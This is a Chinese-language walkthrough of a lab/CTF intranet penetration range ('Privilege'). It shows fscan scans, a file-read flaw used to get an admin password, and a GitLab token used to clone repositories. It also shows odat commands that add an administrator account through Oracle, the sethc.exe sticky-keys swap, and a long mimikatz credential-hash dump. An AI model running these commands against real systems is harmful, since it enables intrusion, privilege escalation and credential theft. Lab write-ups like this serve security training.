## 文章

https://fushuling.com/index.php/2023/10/10/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7privilege/

https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-privilege-writeup/#flag04

## 打靶过程

按照惯例fscan扫

```bash
start infoscan
(icmp) Target 39.98.110.36    is alive
[*] Icmp alive hosts len is: 1
39.98.110.36:3306 open
39.98.110.36:80 open
39.98.110.36:8080 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle: http://39.98.110.36       code:200 len:54646  title:XR SHOP
[*] WebTitle: http://39.98.110.36:8080  code:403 len:548    title:None
```

80一个XR SHOP，wordpress搭建，题目提示源码泄露

dirsearch扫出源码

![image-20231017162127463](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162127463.png)

按照提示找文件读取漏洞，seay自动扫描一下，发现/tools/content-log.php似乎有任意文件读取

![image-20231017162321442](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162321442.png)

确实有

![image-20231017162459313](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162459313.png)

获取管理员密码

![image-20231017162606443](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162606443.png)

8080登录成功

![image-20231017162649294](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162649294.png)

获取gitlab token

![image-20231017162751010](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162751010.png)

解密token

![image-20231017162857412](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017162857412.png)

script这里可以执行命令，创建一个用户rdp连上去

获取flag

![image-20231017163230927](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017163230927.png)

systeminfo看一下

不在域内

![image-20231017163424862](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017163424862.png)

传fscan扫

```bash
(icmp) Target 172.22.14.7     is alive
(icmp) Target 172.22.14.11    is alive
(icmp) Target 172.22.14.16    is alive
(icmp) Target 172.22.14.31    is alive
(icmp) Target 172.22.14.46    is alive
[*] Icmp alive hosts len is: 5
172.22.14.46:445 open
172.22.14.31:445 open
172.22.14.11:445 open
172.22.14.7:445 open
172.22.14.46:139 open
172.22.14.11:139 open
172.22.14.31:139 open
172.22.14.46:135 open
172.22.14.31:135 open
172.22.14.7:139 open
172.22.14.11:135 open
172.22.14.7:135 open
172.22.14.46:80 open
172.22.14.16:80 open
172.22.14.7:80 open
172.22.14.16:22 open
172.22.14.11:88 open
172.22.14.16:8060 open
172.22.14.7:8080 open
172.22.14.31:1521 open
172.22.14.7:3306 open
172.22.14.16:9094 open
172.22.14.46:3389 open
172.22.14.31:3389 open
172.22.14.11:3389 open
172.22.14.7:3389 open
[*] alive ports len is: 26
start vulscan
[*] WebTitle: http://172.22.14.7:8080   code:403 len:548    title:None
[*] NetInfo:
[*]172.22.14.7
   [->]XR-JENKINS
   [->]172.22.14.7
[*] NetInfo:
[*]172.22.14.46
   [->]XR-0923
   [->]172.22.14.46
[*] NetInfo:
[*]172.22.14.31
   [->]XR-ORACLE
   [->]172.22.14.31
[*] WebTitle: http://172.22.14.7        code:200 len:54603  title:XR SHOP
[*] WebTitle: http://172.22.14.46       code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
[*] NetInfo:
[*]172.22.14.11
   [->]XR-DC
   [->]172.22.14.11
[*] NetBios: 172.22.14.31    WORKGROUP\XR-ORACLE
[*] NetBios: 172.22.14.11    [+]DC XIAORANG\XR-DC
[*] NetBios: 172.22.14.46    XIAORANG\XR-0923
[*] WebTitle: http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in
[*] WebTitle: http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab
```

frp挂代理

有token了，获取一下gitlab的projects

![image-20231017165809070](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017165809070.png)

```json
[{
	"id": 6,
	"description": null,
	"name": "Internal Secret",
	"name_with_namespace": "XRLAB / Internal Secret",
	"path": "internal-secret",
	"path_with_namespace": "xrlab/internal-secret",
	"created_at": "2022-12-25T08:30:12.362Z",
	"default_branch": "main",
	"tag_list": [],
	"topics": [],
	"ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/internal-secret.git",
	"http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/internal-secret.git",
	"web_url": "http://gitlab.xiaorang.lab/xrlab/internal-secret",
	"readme_url": null,
	"avatar_url": null,
	"forks_count": 0,
	"star_count": 0,
	"last_activity_at": "2022-12-25T08:30:12.362Z",
	"namespace": {
		"id": 8,
		"name": "XRLAB",
		"path": "xrlab",
		"kind": "group",
		"full_path": "xrlab",
		"parent_id": null,
		"avatar_url": null,
		"web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
	}
}, {
	"id": 4,
	"description": null,
	"name": "XRAdmin",
	"name_with_namespace": "XRLAB / XRAdmin",
	"path": "xradmin",
	"path_with_namespace": "xrlab/xradmin",
	"created_at": "2022-12-25T07:48:16.751Z",
	"default_branch": "main",
	"tag_list": [],
	"topics": [],
	"ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/xradmin.git",
	"http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/xradmin.git",
	"web_url": "http://gitlab.xiaorang.lab/xrlab/xradmin",
	"readme_url": "http://gitlab.xiaorang.lab/xrlab/xradmin/-/blob/main/README.md",
	"avatar_url": null,
	"forks_count": 0,
	"star_count": 0,
	"last_activity_at": "2023-05-30T10:27:31.762Z",
	"namespace": {
		"id": 8,
		"name": "XRLAB",
		"path": "xrlab",
		"kind": "group",
		"full_path": "xrlab",
		"parent_id": null,
		"avatar_url": null,
		"web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
	}
}, {
	"id": 3,
	"description": null,
	"name": "Awenode",
	"name_with_namespace": "XRLAB / Awenode",
	"path": "awenode",
	"path_with_namespace": "xrlab/awenode",
	"created_at": "2022-12-25T07:46:43.635Z",
	"default_branch": "master",
	"tag_list": [],
	"topics": [],
	"ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/awenode.git",
	"http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/awenode.git",
	"web_url": "http://gitlab.xiaorang.lab/xrlab/awenode",
	"readme_url": "http://gitlab.xiaorang.lab/xrlab/awenode/-/blob/master/README.md",
	"avatar_url": null,
	"forks_count": 0,
	"star_count": 0,
	"last_activity_at": "2022-12-25T07:46:43.635Z",
	"namespace": {
		"id": 8,
		"name": "XRLAB",
		"path": "xrlab",
		"kind": "group",
		"full_path": "xrlab",
		"parent_id": null,
		"avatar_url": null,
		"web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
	}
}, {
	"id": 2,
	"description": "Example GitBook site using GitLab Pages: https://pages.gitlab.io/gitbook",
	"name": "XRWiki",
	"name_with_namespace": "XRLAB / XRWiki",
	"path": "xrwiki",
	"path_with_namespace": "xrlab/xrwiki",
	"created_at": "2022-12-25T07:44:18.589Z",
	"default_branch": "master",
	"tag_list": [],
	"topics": [],
	"ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/xrwiki.git",
	"http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/xrwiki.git",
	"web_url": "http://gitlab.xiaorang.lab/xrlab/xrwiki",
	"readme_url": "http://gitlab.xiaorang.lab/xrlab/xrwiki/-/blob/master/README.md",
	"avatar_url": "http://gitlab.xiaorang.lab/uploads/-/system/project/avatar/2/gitbook.png",
	"forks_count": 0,
	"star_count": 0,
	"last_activity_at": "2022-12-25T07:44:18.589Z",
	"namespace": {
		"id": 8,
		"name": "XRLAB",
		"path": "xrlab",
		"kind": "group",
		"full_path": "xrlab",
		"parent_id": null,
		"avatar_url": null,
		"web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
	}
}, {
	"id": 1,
	"description": "This project is automatically generated and helps monitor this GitLab instance. [Learn more](/help/administration/monitoring/gitlab_self_monitoring_project/index).",
	"name": "Monitoring",
	"name_with_namespace": "GitLab Instance / Monitoring",
	"path": "Monitoring",
	"path_with_namespace": "gitlab-instance-23352f48/Monitoring",
	"created_at": "2022-12-25T07:18:20.914Z",
	"default_branch": "main",
	"tag_list": [],
	"topics": [],
	"ssh_url_to_repo": "git@gitlab.xiaorang.lab:gitlab-instance-23352f48/Monitoring.git",
	"http_url_to_repo": "http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git",
	"web_url": "http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring",
	"readme_url": null,
	"avatar_url": null,
	"forks_count": 0,
	"star_count": 0,
	"last_activity_at": "2022-12-25T07:18:20.914Z",
	"namespace": {
		"id": 2,
		"name": "GitLab Instance",
		"path": "gitlab-instance-23352f48",
		"kind": "group",
		"full_path": "gitlab-instance-23352f48",
		"parent_id": null,
		"avatar_url": null,
		"web_url": "http://gitlab.xiaorang.lab/groups/gitlab-instance-23352f48"
	}
}]
```

克隆项目

```bash
git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git
git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git
git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git
```

internal-secret内有凭证，可以去登XR-0923

```bash
XR-0923 | zhangshuai | wSbEajHzZs
```

第三关叫我们获取oracle的敏感信息，那应该在xradmin内有相应的oracle连接配置文件

全局搜索，找到oracle用户和密码

![image-20231017170526305](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017170526305.png)

直接用odat远程执行命令，创建用户

```bash
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec "net user Ki1ro 1234qwer? /add"
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec "net localgroup administrators Ki1ro /add"
```

获取flag

![image-20231017171807495](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017171807495.png)

![image-20231017172104210](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017172104210.png)

在RMU用户组，可以尝试RM shell连接

成功连接

<img src="C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017172337530.png" alt="image-20231017172337530" style="zoom:150%;" />

启用了SeRestorePrivilege权限，可以修改任意文件和注册表，但映像劫持改注册表失败

尝试直接该文件名

```bash
ren sethc.exe sethc.bak
ren cmd.exe sethc.exe
```

再将用户锁定，按5次shift，成功弹出cmd

再加上管理员用户，重新rdp

获取flag

![image-20231017173930917](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017173930917.png)

传猕猴他抓域用户hash

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > 1.txt
```

```bash

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 12607302 (00000000:00c05f46)
Session           : RemoteInteractive from 3
User Name         : Ki1ro
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/10/17 17:38:46
SID               : S-1-5-21-754105099-1176710061-2177073800-1002
	msv :	
	 [00000003] Primary
	 * Username : Ki1ro
	 * Domain   : XR-0923
	 * NTLM     : bc007082d32777855e253fd4defe70ee
	 * SHA1     : c44e77aa5d3caed6ca7e9e59f553fe64ce4000d2
	tspkg :	
	wdigest :	
	 * Username : Ki1ro
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : Ki1ro
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 12592630 (00000000:00c025f6)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/17 17:38:45
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 12591952 (00000000:00c02350)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/17 17:38:45
SID               : S-1-5-96-0-3
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 7052271 (00000000:006b9bef)
Session           : Interactive from 2
User Name         : zhangshuai
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/10/17 17:20:05
SID               : S-1-5-21-754105099-1176710061-2177073800-1001
	msv :	
	 [00000003] Primary
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a
	 * SHA1     : f6ff2714d556240436758527e190e329f05cd43d
	tspkg :	
	wdigest :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6407493 (00000000:0061c545)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/17 17:18:58
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 3730091 (00000000:0038eaab)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2023/10/17 16:43:53
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 64581 (00000000:0000fc45)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:22
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : 8519c5a89b2cd4d679a5a36f26863e5d
	 * SHA1     : 42d8188bc30ff0880b838e368c6e5522b86f978d
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : &H!vqg]om0Iz5Pn1NUGod&R9o /!$EK.?jn06+[J*6oZ\A+H?c2;V\(AgGpKw*f0W\vdUf;QoJ/5#DRZDwR@W5U9Io8`;zE7L":Ay-SKpe#>5S?;IL'HarDD
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : XR-0923$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:21
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xr-0923$
	 * Domain   : XIAORANG.LAB
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 33793 (00000000:00008401)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:21
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 12607273 (00000000:00c05f29)
Session           : RemoteInteractive from 3
User Name         : Ki1ro
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/10/17 17:38:46
SID               : S-1-5-21-754105099-1176710061-2177073800-1002
	msv :	
	 [00000003] Primary
	 * Username : Ki1ro
	 * Domain   : XR-0923
	 * NTLM     : bc007082d32777855e253fd4defe70ee
	 * SHA1     : c44e77aa5d3caed6ca7e9e59f553fe64ce4000d2
	tspkg :	
	wdigest :	
	 * Username : Ki1ro
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : Ki1ro
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 12593686 (00000000:00c02a16)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/17 17:38:45
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6449170 (00000000:00626812)
Session           : RemoteInteractive from 2
User Name         : zhangshuai
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/10/17 17:18:59
SID               : S-1-5-21-754105099-1176710061-2177073800-1001
	msv :	
	 [00000003] Primary
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a
	 * SHA1     : f6ff2714d556240436758527e190e329f05cd43d
	tspkg :	
	wdigest :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6449141 (00000000:006267f5)
Session           : RemoteInteractive from 2
User Name         : zhangshuai
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/10/17 17:18:59
SID               : S-1-5-21-754105099-1176710061-2177073800-1001
	msv :	
	 [00000003] Primary
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a
	 * SHA1     : f6ff2714d556240436758527e190e329f05cd43d
	tspkg :	
	wdigest :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : wSbEajHzZs
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6408598 (00000000:0061c996)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/17 17:18:58
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
